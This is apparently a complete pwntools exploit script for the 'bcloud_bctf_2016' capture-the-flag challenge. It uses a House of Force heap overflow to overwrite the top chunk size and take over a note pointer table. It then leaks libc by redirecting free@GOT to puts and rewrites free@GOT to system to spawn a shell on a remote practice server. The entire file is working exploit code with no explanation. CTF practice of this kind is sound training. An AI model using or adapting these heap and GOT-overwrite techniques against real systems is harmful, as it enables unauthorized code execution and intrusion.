# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
context.log_level = 'debug' 
context.update( os = 'linux', arch = 'i386',timeout = 1)
binary = './bcloud_bctf_2016'
elf = ELF(binary)
#libc = elf.libc
libc = ELF("./libc/libc-2.23-32.so")
context.binary = binary
DEBUG = 0
if DEBUG:
    p = process(binary)
    #p = process(['qemu-aarch64','-L','',binary])
    #p = process(['qemu-aarch64','-L','',-g,'1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28089'
    p = remote(host,port)
l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda a          : int( p.recv(len(str(a)))[2:] , 16)
def dbg():
    gdb.attach(p)
    pause()

def cmd(num):
    sla('>',num)

def add(size,content):
    cmd(1)
    sla("note content:",size)
    sla("content:",content)

def edit(idx,content):
    cmd(3)
    sla("id:",idx)
    sla("content:",content)

def delete(idx):
    cmd(4)
    sla("id:",idx)

puts_addr = elf.plt["puts"]
puts_got = elf.got["puts"]
free_got = elf.got["free"]

ptr_list = 0x0804B120
sa("name:", "niyah".rjust(0x40,"a") )

ru("niyah")
top_addr = u32(p.recv(4)) + 0xd0
lg("top_addr",top_addr)

sa("rg:","b"*0x40)
sla("st:",p32(0xffffffff))

size = ptr_list - top_addr - 0x10

add(size,"")
add(0x18,"\x00")

payload = p32(0) + p32(free_got) + p32(puts_got) + p32(ptr_list + 0x10) + "sh\x00"
edit(1,payload)

edit(1,p32(puts_addr))
delete(2)

puts_libc = l32()
lg("puts_libc",puts_libc)

libc.address = puts_libc - libc.sym["puts"]
system_addr = libc.sym["system"]

edit(1,p32(system_addr))
delete(3)


p.interactive()

'''
@File    :   bcloud_bctf_2016.py
@Time    :   2021/07/15 18:50:35
@Author  :   Niyah 
'''